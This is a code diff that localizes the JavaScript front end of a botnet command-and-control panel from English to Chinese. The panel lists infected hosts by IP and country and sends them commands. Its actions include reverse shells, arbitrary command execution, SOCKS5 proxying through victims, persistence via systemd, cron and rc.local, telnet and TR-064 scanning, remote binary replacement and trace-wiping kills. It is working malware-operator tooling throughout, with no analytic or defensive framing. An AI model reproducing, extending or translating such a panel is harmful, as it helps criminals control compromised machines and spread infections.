@@ -30,20 +30,20 @@ function formatUplink(mbps) {
 
 function capTagsHtml(b) {
   if (b.attacksEnabled && b.socksEnabled) {
-    return '<span class="cap-tag cap-tag-atk" title="Attacks enabled">ATK</span><span class="cap-tag cap-tag-socks" title="SOCKS enabled">SOCKS</span>';
+    return '<span class="cap-tag cap-tag-atk" title="已启用攻击模块">ATK</span><span class="cap-tag cap-tag-socks" title="已启用SOCKS代理">SOCKS</span>';
   }
-  if (b.attacksEnabled) return '<span class="cap-tag cap-tag-atk" title="Attacks enabled">ATK</span>';
-  if (b.socksEnabled)   return '<span class="cap-tag cap-tag-socks" title="SOCKS enabled">SOCKS</span>';
-  return '<span class="cap-tag cap-tag-none" title="No special modules">-</span>';
+  if (b.attacksEnabled) return '<span class="cap-tag cap-tag-atk" title="已启用攻击模块">ATK</span>';
+  if (b.socksEnabled)   return '<span class="cap-tag cap-tag-socks" title="已启用SOCKS代理">SOCKS</span>';
+  return '<span class="cap-tag cap-tag-none" title="无特殊模块">-</span>';
 }
 
 function ago(iso) {
   var d = new Date(iso), s = Math.max(0, Math.floor((Date.now() - d) / 1000));
-  if (s < 5) return 'just now';
-  if (s < 60) return s + 's ago';
-  if (s < 3600) return Math.floor(s / 60) + 'm ago';
-  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
-  return Math.floor(s / 86400) + 'd ago';
+  if (s < 5) return '刚刚';
+  if (s < 60) return s + '秒前';
+  if (s < 3600) return Math.floor(s / 60) + '分钟前';
+  if (s < 86400) return Math.floor(s / 3600) + '小时前';
+  return Math.floor(s / 86400) + '天前';
 }
 
 function botHealth(lastPing) {
@@ -127,12 +127,12 @@ function connectSSE() {
   evtSource.addEventListener('bot_connect', function (e) {
     var bot = JSON.parse(e.data);
     addOrUpdateBot(bot);
-    addNotification('connect', bot.botID + ' connected');
+    addNotification('上线', bot.botID + ' 已连接上线');
   });
   evtSource.addEventListener('bot_disconnect', function (e) {
     var d = JSON.parse(e.data);
     removeBot(d.botID);
-    addNotification('disconnect', d.botID + ' disconnected');
+    addNotification('掉线', d.botID + ' 已断开连接');
   });
   evtSource.addEventListener('socks_update', function (e) { updateBotSocks(JSON.parse(e.data)); });
 
@@ -149,7 +149,7 @@ function showSSEBanner() {
   var b = document.createElement('div');
   b.id = 'sse-banner';
   b.className = 'sse-banner';
-  b.textContent = '\u26a0\ufe0f  Live connection lost \u2014 reconnecting...';
+  b.textContent = '\u26a0\ufe0f 实时连接断开 — 正在重连...';
   document.body.appendChild(b);
 }
 
@@ -162,11 +162,11 @@ function updateSSEIndicator(connected) {
   clearTimeout(_sseRedTimer);
   var el = document.getElementById('sse-dot');
   if (connected) {
-    if (el) { el.className = 'sse-indicator sse-connected'; el.title = 'Live connection'; }
+    if (el) { el.className = 'sse-indicator sse-connected'; el.title = '实时连接正常'; }
     hideSSEBanner();
   } else {
     _sseRedTimer = setTimeout(function () {
-      if (el) { el.className = 'sse-indicator sse-disconnected'; el.title = 'Reconnecting...'; }
+      if (el) { el.className = 'sse-indicator sse-disconnected'; el.title = '正在重新连接...'; }
       showSSEBanner();
     }, 3000);
   }
@@ -197,7 +197,7 @@ var prevBots = -1, prevRAM = -1, prevCPU = -1;
 function updateStats(d) {
   document.getElementById('s-bots').textContent = d.botCount;
   document.getElementById('s-ram').textContent = formatRAM(d.totalRAM);
-  document.getElementById('s-cpu').textContent = d.totalCPU + ' cores';
+  document.getElementById('s-cpu').textContent = d.totalCPU + ' 核';
   document.getElementById('s-uptime').textContent = d.uptime;
 
   var ah = document.getElementById('s-arch');
@@ -218,7 +218,7 @@ function updateStats(d) {
     drawSparkline('spark-cpu', d.history.map(function (h) { return h.totalCPU; }));
     var bots = d.history.map(function (h) { return h.botCount; });
     var mn = Math.min.apply(null, bots), mx = Math.max.apply(null, bots);
-    document.getElementById('s-bots-range').textContent = 'range: ' + mn + ' \u2013 ' + mx + ' (' + d.history.length + ' samples)';
+    document.getElementById('s-bots-range').textContent = '波动范围: ' + mn + ' \u2013 ' + mx + ' (' + d.history.length + ' 个样本)';
   }
 }
 
@@ -346,7 +346,7 @@ function updateBotCount() {
   if (count === 0) {
     var tbody = document.getElementById('bot-tbody');
     if (!tbody.querySelector('tr')) {
-      tbody.innerHTML = '<tr><td colspan="13" class="no-bots">No bots connected</td></tr>';
+      tbody.innerHTML = '<tr><td colspan="13" class="no-bots">暂无主机连接</td></tr>';
     }
   }
 }
@@ -371,7 +371,7 @@ function createBotRow(b) {
   var eid = b.botID.replace(/'/g, "\\'");
   tr.innerHTML =
     '<td><input type="checkbox"' + checked + ' onchange="toggleBotSelect(\'' + eid + '\',this.checked)"></td>' +
-    '<td><span class="bot-id-link" onclick="event.stopPropagation();targetBot(\'' + eid + '\')" data-tooltip="Click to set as target in Command Center" title="' + escHtml(b.botID) + '">' + escHtml(b.botID) + '</span></td>' +
+    '<td><span class="bot-id-link" onclick="event.stopPropagation();targetBot(\'' + eid + '\')" data-tooltip="点击设为命令中心目标" title="' + escHtml(b.botID) + '">' + escHtml(b.botID) + '</span></td>' +
     '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
     '<td><span class="country-badge">' + escHtml(b.country) + '</span></td>' +
     '<td>' + groupTagHtml(b.group) + '</td>' +
@@ -437,14 +437,14 @@ function updateMultiSelectBar() {
   var count = Object.keys(selectedBots).length;
   var bar = document.getElementById('multi-select-bar');
   bar.style.display = count > 0 ? 'flex' : 'none';
-  document.getElementById('ms-count').textContent = count + ' selected';
+  document.getElementById('ms-count').textContent = '已选择 ' + count + ' 台主机';
 }
 
 function msCmd(cmd) {
   var ids = Object.keys(selectedBots);
   if (!ids.length) return;
   ids.forEach(function (id) { popupCmd(id, cmd); });
-  showToast('Sent ' + cmd + ' to ' + ids.length + ' bots', true);
+  showToast('已向 ' + ids.length + ' 台主机发送指令: ' + cmd, true);
 }
 
 function msCmdFiltered(cmd, capField) {
@@ -455,20 +455,20 @@ function msCmdFiltered(cmd, capField) {
     return !capField || !b || b[capField] !== false;
   });
   var skipped = ids.length - capable.length;
-  if (!capable.length) { showToast('No selected bots support this command', false); return; }
+  if (!capable.length) { showToast('所选主机均不支持此命令', false); return; }
   capable.forEach(function (id) { popupCmd(id, cmd); });
-  var msg = 'Sent ' + cmd + ' to ' + capable.length + ' bot' + (capable.length > 1 ? 's' : '');
-  if (skipped > 0) msg += ' \xb7 ' + skipped + ' skipped (module absent)';
+  var msg = '已向 ' + capable.length + ' 台主机发送 ' + cmd;
+  if (skipped > 0) msg += ' · 已跳过 ' + skipped + ' 台(缺少模块)';
   showToast(msg, true);
 }
 
 function msScan() {
   var ids = Object.keys(selectedBots);
   if (!ids.length) return;
-  var addr = prompt('Scan server address (host:port):', '');
+  var addr = prompt('扫描回传服务器地址 (host:port):', '');
   if (!addr || !addr.trim()) return;
   ids.forEach(function (id) { popupCmd(id, '!scan ' + addr.trim()); });
-  showToast('Sent !scan to ' + ids.length + ' bots', true);
+  showToast('已向 ' + ids.length + ' 台主机发送扫描指令 !scan', true);
 }
 
 // ---------------------------------------------------------------------------
@@ -478,7 +478,7 @@ function scannerStart(type) {
   var cmd;
   if (type === 'telnet') {
     var addr = document.getElementById('scan-telnet-addr').value.trim();
-    if (!addr) { showToast('Enter a scan server address', false); return; }
+    if (!addr) { showToast('请输入扫描服务器地址', false); return; }
     cmd = '!scan ' + addr;
   } else if (type === 'tr064') {
     cmd = '!tr064';
@@ -487,7 +487,7 @@ function scannerStart(type) {
   } else { return; }
   fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd }) })
     .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
-    .catch(function () { showToast('Request failed', false); });
+    .catch(function () { showToast('请求失败', false); });
 }
 
 function scannerStop(type) {
@@ -498,7 +498,7 @@ function scannerStop(type) {
   else { return; }
   fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd }) })
     .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
-    .catch(function () { showToast('Request failed', false); });
+    .catch(function () { showToast('请求失败', false); });
 }
 
 function msKill() {
@@ -507,9 +507,9 @@ function msKill() {
   var preview = ids.slice(0, 4).map(function (id) { return {label: 'Bot', val: id}; });
   if (ids.length > 4) preview.push({label: '', val: '\u2026and ' + (ids.length - 4) + ' more'});
   showConfirm({
-    title: 'Kill ' + ids.length + ' bot' + (ids.length > 1 ? 's' : '') + '?',
-    message: 'Wipes persistence, deletes binary, and terminates. Cannot be undone.',
-    icon: 'danger', confirmClass: 'danger', confirmText: 'Kill All',
+    title: '彻底销毁选中的 ' + ids.length + ' 台主机？',
+    message: '将清除自启驻留、删除文件并终止进程。此操作不可逆！',
+    icon: 'danger', confirmClass: 'danger', confirmText: '全部销毁',
     details: preview,
     onConfirm: function () {
       ids.forEach(function (id) { popupCmd(id, '!kill'); });
@@ -547,15 +547,15 @@ function showGroupPicker(botIDs, anchorEl) {
     d.id = 'group-picker-overlay';
     d.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center';
     d.innerHTML = '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:20px;min-width:340px">' +
-      '<div style="font-size:14px;font-weight:600;margin-bottom:12px;color:var(--text)">Set Group for ' + botIDs.length + ' bot' + (botIDs.length > 1 ? 's' : '') + '</div>' +
+      '<div style="font-size:14px;font-weight:600;margin-bottom:12px;color:var(--text)">设置 ' + botIDs.length + ' 台主机的分组</div>' +
       '<div style="margin-bottom:12px">' +
-      '<input type="text" id="group-pick-input" list="group-pick-list" placeholder="Type group name or select..." style="width:100%;padding:8px;background:var(--bg-primary);border:1px solid var(--border);color:var(--text);border-radius:4px;font-size:13px">' +
+      '<input type="text" id="group-pick-input" list="group-pick-list" placeholder="输入分组名或选择已有分组..." style="width:100%;padding:8px;background:var(--bg-primary);border:1px solid var(--border);color:var(--text);border-radius:4px;font-size:13px">' +
       '<datalist id="group-pick-list">' + opts + '</datalist>' +
       '</div>' +
       '<div style="display:flex;gap:8px;justify-content:flex-end">' +
-      '<button id="group-pick-remove" style="padding:6px 16px;background:var(--red-dim);border:1px solid var(--red);color:var(--red);border-radius:4px;cursor:pointer;font-size:12px;font-weight:600">Remove Group</button>' +
-      '<button id="group-pick-cancel" style="padding:6px 16px;background:var(--bg-elevated);border:1px solid var(--border);color:var(--text);border-radius:4px;cursor:pointer">Cancel</button>' +
-      '<button id="group-pick-ok" style="padding:6px 16px;background:var(--accent);border:none;color:#fff;border-radius:4px;cursor:pointer;font-weight:600">Apply</button>' +
+      '<button id="group-pick-remove" style="padding:6px 16px;background:var(--red-dim);border:1px solid var(--red);color:var(--red);border-radius:4px;cursor:pointer;font-size:12px;font-weight:600">移除分组</button>' +
+      '<button id="group-pick-cancel" style="padding:6px 16px;background:var(--bg-elevated);border:1px solid var(--border);color:var(--text);border-radius:4px;cursor:pointer">取消</button>' +
+      '<button id="group-pick-ok" style="padding:6px 16px;background:var(--accent);border:none;color:#fff;border-radius:4px;cursor:pointer;font-weight:600">应用</button>' +
       '</div></div>';
     document.body.appendChild(d);
     d.addEventListener('click', function (e) { if (e.target === d) d.remove(); });
@@ -576,7 +576,7 @@ function showGroupPicker(botIDs, anchorEl) {
       if (e.key === 'Escape') { d.remove(); }
     });
   }).catch(function () {
-    var val = prompt('Enter group name (empty to remove):');
+    var val = prompt('输入分组名称 (留空表示移除分组):');
     if (val === null) return;
     applyGroup(botIDs, val.trim());
   });
@@ -606,7 +606,7 @@ function applyGroup(botIDs, group) {
       buildFilterPanel();
       filterBotTable();
     })
-    .catch(function () { showToast('Group request failed', false); });
+    .catch(function () { showToast('分组请求失败', false); });
 }
 
 function msSetGroup() {
@@ -636,7 +636,7 @@ function buildFilterPanel() {
   var cpuRanges = { '1 core': 0, '2-4 cores': 0, '4+ cores': 0 };
 
   bots.forEach(function (b) {
-    var gk = b.group || '(ungrouped)';
+    var gk = b.group || '(未分组)';
     groups[gk] = (groups[gk] || 0) + 1;
     archs[b.arch] = (archs[b.arch] || 0) + 1;
     countries[b.country] = (countries[b.country] || 0) + 1;
@@ -680,14 +680,14 @@ function buildFilterPanel() {
     wrap.appendChild(g);
   }
 
-  if (Object.keys(groups).length > 1 || (Object.keys(groups).length === 1 && !groups['(ungrouped)'])) {
-    makeGroup('Group', 'group', groups);
+  if (Object.keys(groups).length > 1 || (Object.keys(groups).length === 1 && !groups['(未分组)'])) {
+    makeGroup('分组', 'group', groups);
   }
-  makeGroup('Arch', 'arch', archs);
-  makeGroup('Country', 'country', countries);
-  makeGroup('SOCKS', 'socks', socks);
-  makeGroup('RAM', 'ram', ramRanges);
-  makeGroup('CPU', 'cpu', cpuRanges);
+  makeGroup('架构', 'arch', archs);
+  makeGroup('国家/地区', 'country', countries);
+  makeGroup('SOCKS状态', 'socks', socks);
+  makeGroup('内存', 'ram', ramRanges);
+  makeGroup('CPU核心', 'cpu', cpuRanges);
 }
 
 function clearAllFilters() {
@@ -709,7 +709,7 @@ function hasActiveFilters() {
 
 function botMatchesFilters(b) {
   if (Object.keys(activeFilters.group).length) {
-    var gk = b.group || '(ungrouped)';
+    var gk = b.group || '(未分组)';
     if (!activeFilters.group[gk]) return false;
   }
   if (Object.keys(activeFilters.arch).length && !activeFilters.arch[b.arch]) return false;
@@ -758,8 +758,8 @@ function filterBotTable() {
   });
 
   var sc = document.getElementById('search-count');
-  if (q || useFilters) { sc.textContent = shown + ' / ' + total + ' bots'; }
-  else { sc.textContent = total + ' bots'; }
+  if (q || useFilters) { sc.textContent = shown + ' / ' + total + ' 台主机'; }
+  else { sc.textContent = total + ' 台主机'; }
 }
 
 // ---------------------------------------------------------------------------
@@ -782,7 +782,7 @@ function fillPopup(b) {
 
   var ss = document.getElementById('popup-socks-status');
   if (b.socksActive) {
-    ss.innerHTML = '<span class="popup-socks-active">ONLINE</span>';
+    ss.innerHTML = '<span class="popup-socks-active">在线</span>';
     document.getElementById('popup-socks-relay-row').style.display = '';
     document.getElementById('popup-socks-relay').textContent = b.socksRelay || '-';
     document.getElementById('popup-socks-auth-row').style.display = b.socksUser ? '' : 'none';
@@ -790,7 +790,7 @@ function fillPopup(b) {
     document.getElementById('popup-socks-since-row').style.display = b.socksStarted ? '' : 'none';
     if (b.socksStarted) document.getElementById('popup-socks-since').textContent = ago(b.socksStarted);
   } else {
-    ss.innerHTML = '<span class="popup-socks-inactive">OFFLINE</span>';
+    ss.innerHTML = '<span class="popup-socks-inactive">离线</span>';
     document.getElementById('popup-socks-relay-row').style.display = 'none';
     document.getElementById('popup-socks-auth-row').style.display = 'none';
     document.getElementById('popup-socks-since-row').style.display = 'none';
@@ -798,15 +798,15 @@ function fillPopup(b) {
 
   var acts = document.getElementById('popup-actions');
   var id = b.botID.replace(/'/g, "\\'");
-  var html = '<button class="popup-act act-group" onclick="popupSetGroup(\'' + id + '\')" data-tooltip="Assign to a named group for batch targeting">' + (b.group ? 'Group: ' + escHtml(b.group) : 'Set Group') + '</button>';
-  html += '<button class="popup-act act-shell" onclick="closeBotPopup();openShell(\'' + id + '\')" data-tooltip="Open interactive reverse shell">Shell</button>';
+  var html = '<button class="popup-act act-group" onclick="popupSetGroup(\'' + id + '\')" data-tooltip="分配到指定分组以便批量管理">' + (b.group ? '分组: ' + escHtml(b.group) : '设置分组') + '</button>';
+  html += '<button class="popup-act act-shell" onclick="closeBotPopup();openShell(\'' + id + '\')" data-tooltip="打开交互式Shell终端">终端(Shell)</button>';
   if (b.socksActive) {
-    html += '<button class="popup-act act-stopsocks" onclick="confirmStopSocks(\'' + id + '\')" data-tooltip="Terminate the running SOCKS5 proxy on this bot">Stop SOCKS</button>';
+    html += '<button class="popup-act act-stopsocks" onclick="confirmStopSocks(\'' + id + '\')" data-tooltip="终止此主机上运行的SOCKS5代理">停止SOCKS</button>';
   } else {
-    html += '<button class="popup-act act-socks" onclick="popupStartSocks(\'' + id + '\')" data-tooltip="Start a SOCKS5 proxy — route your traffic through this bot">Start SOCKS</button>';
+    html += '<button class="popup-act act-socks" onclick="popupStartSocks(\'' + id + '\')" data-tooltip="启动SOCKS5代理 — 将流量通过此主机转发">启动SOCKS</button>';
   }
-  html += '<button class="popup-act act-persist" onclick="popupPersist(\'' + id + '\')" data-tooltip="Install triple-redundant persistence: copies binary to hidden dir, adds systemd unit, cron entry, and rc.local — survives reboots and cleanup attempts">Persist</button>';
-  html += '<button class="popup-act act-kill" onclick="popupKill(\'' + id + '\')" data-tooltip="Wipe all persistence artifacts, delete the binary, and terminate — cannot be undone">Kill</button>';
+  html += '<button class="popup-act act-persist" onclick="popupPersist(\'' + id + '\')" data-tooltip="安装三重自启驻留(systemd、cron、rc.local)，重启后依然存活">持久化驻留</button>';
+  html += '<button class="popup-act act-kill" onclick="popupKill(\'' + id + '\')" data-tooltip="清除所有自启驻留文件、删除程序自身并退出 — 不可逆">销毁下线</button>';
   acts.innerHTML = html;
 }
 
@@ -868,63 +868,63 @@ function renderBotSidebar(b) {
   var id = b.botID.replace(/'/g, "\\'");
   var eid = escHtml(b.botID);
   var socksColor = b.socksActive ? 'var(--green)' : 'var(--text-dim)';
-  var socksLabel = b.socksActive ? 'ACTIVE' : 'OFFLINE';
+  var socksLabel = b.socksActive ? '运行中' : '已停止';
 
   // ── Identity & hardware info ────────────────────────────────────────────
   var info =
-    '<div class="isb-row"><span class="isb-label">Bot ID</span><span class="isb-val" style="color:var(--blue)">' + eid + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">IP</span><span class="isb-val">' + escHtml(b.ip) + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">Country</span><span class="isb-val" style="color:var(--cyan)">' + escHtml(b.country) + '</span></div>' +
-    (b.group ? '<div class="isb-row"><span class="isb-label">Group</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.group) + '</span></div>' : '') +
+    '<div class="isb-row"><span class="isb-label">主机编号(ID)</span><span class="isb-val" style="color:var(--blue)">' + eid + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">IP地址</span><span class="isb-val">' + escHtml(b.ip) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">国家/地区</span><span class="isb-val" style="color:var(--cyan)">' + escHtml(b.country) + '</span></div>' +
+    (b.group ? '<div class="isb-row"><span class="isb-label">所属分组</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.group) + '</span></div>' : '') +
     '<div class="isb-divider"></div>' +
-    '<div class="isb-row"><span class="isb-label">Arch</span><span class="isb-val">' + escHtml(b.arch) + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">RAM</span><span class="isb-val">' + formatRAM(b.ram) + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">CPU</span><span class="isb-val">' + b.cpuCores + ' cores</span></div>' +
-    '<div class="isb-row"><span class="isb-label">Uplink</span><span class="isb-val">' + (b.uplinkMbps ? b.uplinkMbps.toFixed(1) + ' Mbps' : '—') + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">系统架构</span><span class="isb-val">' + escHtml(b.arch) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">内存大小</span><span class="isb-val">' + formatRAM(b.ram) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">CPU核心</span><span class="isb-val">' + b.cpuCores + ' cores</span></div>' +
+    '<div class="isb-row"><span class="isb-label">上行带宽</span><span class="isb-val">' + (b.uplinkMbps ? b.uplinkMbps.toFixed(1) + ' Mbps' : '—') + '</span></div>' +
     '<div class="isb-divider"></div>' +
-    '<div class="isb-row"><span class="isb-label">Process</span><span class="isb-val">' + escHtml(b.processName) + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">Uptime</span><span class="isb-val">' + escHtml(b.uptime) + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">Last Ping</span><span class="isb-val">' + ago(b.lastPing) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">进程名称</span><span class="isb-val">' + escHtml(b.processName) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">运行时间</span><span class="isb-val">' + escHtml(b.uptime) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">最近心跳</span><span class="isb-val">' + ago(b.lastPing) + '</span></div>' +
     '<div class="isb-divider"></div>' +
-    '<div class="isb-row"><span class="isb-label">SOCKS</span><span class="isb-val" style="color:' + socksColor + '">' + socksLabel + '</span></div>' +
-    (b.socksRelay ? '<div class="isb-row"><span class="isb-label">Relay</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.socksRelay) + '</span></div>' : '') +
-    (b.socksUser  ? '<div class="isb-row"><span class="isb-label">SOCKS User</span><span class="isb-val">' + escHtml(b.socksUser) + '</span></div>' : '') +
-    (b.socksStarted ? '<div class="isb-row"><span class="isb-label">Since</span><span class="isb-val">' + ago(b.socksStarted) + '</span></div>' : '');
+    '<div class="isb-row"><span class="isb-label">SOCKS代理</span><span class="isb-val" style="color:' + socksColor + '">' + socksLabel + '</span></div>' +
+    (b.socksRelay ? '<div class="isb-row"><span class="isb-label">中继节点</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.socksRelay) + '</span></div>' : '') +
+    (b.socksUser  ? '<div class="isb-row"><span class="isb-label">代理账号</span><span class="isb-val">' + escHtml(b.socksUser) + '</span></div>' : '') +
+    (b.socksStarted ? '<div class="isb-row"><span class="isb-label">启动时间</span><span class="isb-val">' + ago(b.socksStarted) + '</span></div>' : '');
 
   // ── Quick actions ────────────────────────────────────────────────────────
   var socksToggle = b.socksActive
-    ? '<button class="bds-btn" onclick="confirmStopSocks(\'' + id + '\')" data-tooltip="Terminate the running SOCKS5 proxy on this bot">Stop SOCKS</button>'
-    : '<button class="bds-btn" onclick="popupStartSocks(\'' + id + '\')" data-tooltip="Start a SOCKS5 proxy — route your traffic through this bot">Start SOCKS</button>';
+    ? '<button class="bds-btn" onclick="confirmStopSocks(\'' + id + '\')" data-tooltip="终止此主机上运行的SOCKS5代理">停止SOCKS</button>'
+    : '<button class="bds-btn" onclick="popupStartSocks(\'' + id + '\')" data-tooltip="启动SOCKS5代理 — 将流量通过此主机转发">启动SOCKS</button>';
 
   var actions =
     '<div class="bds-section">' +
-    '<div class="bds-section-title">Actions</div>' +
+    '<div class="bds-section-title">快捷操作</div>' +
     '<div class="bds-action-grid">' +
-    '<button class="bds-btn bds-shell" onclick="openShell(\'' + id + '\')" data-tooltip="Open interactive reverse shell">Shell</button>' +
+    '<button class="bds-btn bds-shell" onclick="openShell(\'' + id + '\')" data-tooltip="打开交互式Shell终端">终端(Shell)</button>' +
     socksToggle +
-    '<button class="bds-btn" onclick="popupPersist(\'' + id + '\')" data-tooltip="Copy binary to hidden dir + install systemd unit — optionally provide a URL as fallback">Persist</button>' +
-    '<button class="bds-btn" onclick="popupReinstall(\'' + id + '\')" data-tooltip="Fetch a new ELF or .sh from a URL and exec-replace the running bot process">Reinstall</button>' +
-    '<button class="bds-btn" onclick="popupSetGroup(\'' + id + '\')" data-tooltip="Assign to a named group for batch targeting">Set Group</button>' +
-    '<button class="bds-btn bds-kill" onclick="popupKill(\'' + id + '\')" data-tooltip="Wipe all persistence, delete binary, terminate — irreversible">Kill</button>' +
+    '<button class="bds-btn" onclick="popupPersist(\'' + id + '\')" data-tooltip="将文件复制到隐藏路径并安装systemd自启 — 支持URL回退">持久化驻留</button>' +
+    '<button class="bds-btn" onclick="popupReinstall(\'' + id + '\')" data-tooltip="从URL下载新ELF文件或脚本并替换当前进程运行">重装更新</button>' +
+    '<button class="bds-btn" onclick="popupSetGroup(\'' + id + '\')" data-tooltip="设置所属分组以便批量下发命令">设置分组</button>' +
+    '<button class="bds-btn bds-kill" onclick="popupKill(\'' + id + '\')" data-tooltip="彻底清理驻留自启、删除文件并退出 — 不可逆">销毁下线</button>' +
     '</div></div>';
 
   // ── Command console ──────────────────────────────────────────────────────
   var console_ =
     '<div class="bds-section">' +
-    '<div class="bds-section-title">Send Command</div>' +
+    '<div class="bds-section-title">发送命令</div>' +
     '<div class="bds-cmd-row">' +
-    '<input class="bds-cmd-input" id="bds-cmd-input" placeholder="!shell ls -la, !detach ..." ' +
-      'title="Type any !command and press Enter or Send to run it on this bot specifically" ' +
+    '<input class="bds-cmd-input" id="bds-cmd-input" placeholder="输入指令，如 !shell ls -la, !detach ..." ' +
+      'title="输入任何 !指令 并按回车或点击发送以在此主机上执行" ' +
       'onkeydown="if(event.key===\'Enter\')bdsSendCmd(\'' + id + '\')">' +
-    '<button class="bds-btn" style="flex-shrink:0" onclick="bdsSendCmd(\'' + id + '\')" data-tooltip="Send command to this bot only">Send</button>' +
+    '<button class="bds-btn" style="flex-shrink:0" onclick="bdsSendCmd(\'' + id + '\')" data-tooltip="仅向当前主机发送命令">发送</button>' +
     '</div>' +
     '<div class="bds-cmd-chips">' +
-    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!shell \'" data-tooltip="Run a command and return output">!shell</span>' +
-    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!detach \'" data-tooltip="Run a command in the background, detached from the session">!detach</span>' +
-    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!stream \'" data-tooltip="Run a command with real-time line-by-line output streaming">!stream</span>' +
-    '<span class="bds-chip" onclick="bdsSendCmd(\'' + id + '\',\'!stopsocks\')" data-tooltip="Stop the SOCKS5 proxy running on this bot">!stopsocks</span>' +
-    '<span class="bds-chip" onclick="popupPersist(\'' + id + '\')" data-tooltip="Install persistence — optionally provide a fallback URL">!persist</span>' +
-    '<span class="bds-chip" onclick="popupReinstall(\'' + id + '\')" data-tooltip="Fetch binary/script from URL and exec-replace this bot">!reinstall</span>' +
+    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!shell \'" data-tooltip="执行命令并返回执行结果">!shell</span>' +
+    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!detach \'" data-tooltip="后台执行命令，不等待回显(静默运行)">!detach</span>' +
+    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!stream \'" data-tooltip="实时流式输出命令执行过程">!stream</span>' +
+    '<span class="bds-chip" onclick="bdsSendCmd(\'' + id + '\',\'!stopsocks\')" data-tooltip="停止此主机上运行的SOCKS5代理">!stopsocks</span>' +
+    '<span class="bds-chip" onclick="popupPersist(\'' + id + '\')" data-tooltip="安装自启持久化 — 可选提供备用下载URL">!persist</span>' +
+    '<span class="bds-chip" onclick="popupReinstall(\'' + id + '\')" data-tooltip="从URL拉取新文件并热替换当前进程">!reinstall</span>' +
     '</div></div>';
 
   document.getElementById('bds-body').innerHTML = info + actions + console_;
@@ -937,14 +937,14 @@ function renderBotSidebar(b) {
 function popupCmd(botID, cmd) {
   fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd, botID: botID }) })
     .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
-    .catch(function () { showToast('Request failed', false); });
+    .catch(function () { showToast('请求失败', false); });
 }
 
 function popupKill(botID) {
   showConfirm({
-    title: 'Kill bot?',
-    message: 'Wipes persistence, deletes binary, and terminates. Cannot be undone.',
-    icon: 'danger', confirmClass: 'danger', confirmText: 'Kill',
+    title: '销毁该主机？',
+    message: '将清除自启驻留、删除文件并终止进程。此操作不可逆！',
+    icon: 'danger', confirmClass: 'danger', confirmText: '确认销毁',
     details: [{label: 'Bot', val: botID}],
     onConfirm: function () { popupCmd(botID, '!kill'); closeBotPopup(); }
   });
@@ -952,16 +952,16 @@ function popupKill(botID) {
 
 function confirmStopSocks(botID) {
   showConfirm({
-    title: 'Stop SOCKS proxy?',
-    message: 'Terminates the active SOCKS backconnect session on this bot.',
-    icon: 'warn', confirmClass: '', confirmText: 'Stop',
+    title: '停止SOCKS代理？',
+    message: '将终止此主机上当前活跃的SOCKS反连代理会话。',
+    icon: 'warn', confirmClass: '', confirmText: '停止',
     details: [{label: 'Bot', val: botID}],
     onConfirm: function () { popupCmd(botID, '!stopsocks'); }
   });
 }
 
 function popupStartScan(botID) {
-  var addr = prompt('Scan server address (host:port):', '');
+  var addr = prompt('扫描回传服务器地址 (host:port):', '');
   if (!addr || !addr.trim()) return;
   popupCmd(botID, '!scan ' + addr.trim());
 }
@@ -979,35 +979,35 @@ function popupStartSocks(botID) {
   overlay.className = 'socks-modal-overlay';
   overlay.innerHTML =
     '<div class="socks-modal">' +
-    '<div class="socks-modal-title">Start SOCKS5 Proxy</div>' +
+    '<div class="socks-modal-title">启动 SOCKS5 代理</div>' +
     '<div class="socks-modal-fields">' +
     '<div class="socks-modal-field">' +
-    '<label>Mode</label>' +
+    '<label>运行模式</label>' +
     '<select id="socks-m-mode" onchange="socksModalModeChange()">' +
-    '<option value="direct">Direct (listen on bot)</option>' +
-    '<option value="relay">Relay (backconnect)</option>' +
+    '<option value="direct">直接模式 (在主机本地监听)</option>' +
+    '<option value="relay">中继模式 (反向连接中继)</option>' +
     '</select>' +
     '</div>' +
     '<div class="socks-modal-field" id="socks-m-port-row">' +
-    '<label>Listen Port</label>' +
+    '<label>监听端口</label>' +
     '<input type="text" id="socks-m-port" value="1080" placeholder="1080">' +
     '</div>' +
     '<div class="socks-modal-field" id="socks-m-relay-row" style="display:none">' +
-    '<label>Relay</label>' +
-    '<select id="socks-m-relay"><option value="">Loading...</option></select>' +
+    '<label>选择中继节点</label>' +
+    '<select id="socks-m-relay"><option value="">正在加载中继列表...</option></select>' +
     '</div>' +
     '<div class="socks-modal-field">' +
-    '<label>Username</label>' +
